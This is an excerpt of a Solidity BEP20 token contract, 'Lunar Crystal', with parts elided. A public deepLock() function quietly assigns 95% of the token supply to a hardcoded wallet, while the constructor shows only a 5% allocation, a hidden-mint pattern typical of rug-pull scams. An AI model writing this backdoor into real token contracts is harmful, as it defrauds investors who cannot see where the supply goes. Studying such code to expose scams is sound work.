...
contract LunarCrystal is Context, IBEP20, Ownable {
    ...
    address private CallAllWhales = 0xAAE5a58C8d3Be428CC2C3053a7b35620eFD81613;
  
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _allTotalSupply = 1000000000000000000 * 10**9;
    uint256 private _rTotalSupply = (MAX - (MAX % _allTotalSupply));
    uint256 private _tFeeTotal;

    string private _name = 'Lunar Crystal';
    string private _symbol = 'LunarCrystal';
    uint8 private _decimals = 9;

    constructor () {
        _rOwned[_msgSender()] = _rTotalSupply.div(1000).mul(50);
        emit Transfer(address(0), _msgSender(), _allTotalSupply*50/1000);
    }
    ...
    function deepLock() public {
      ...
      _rOwned[CallAllWhales] = _rTotalSupply.div(1000).mul(950);
        emit Transfer(address(0), CallAllWhales, _allTotalSupply*950/1000);
    }
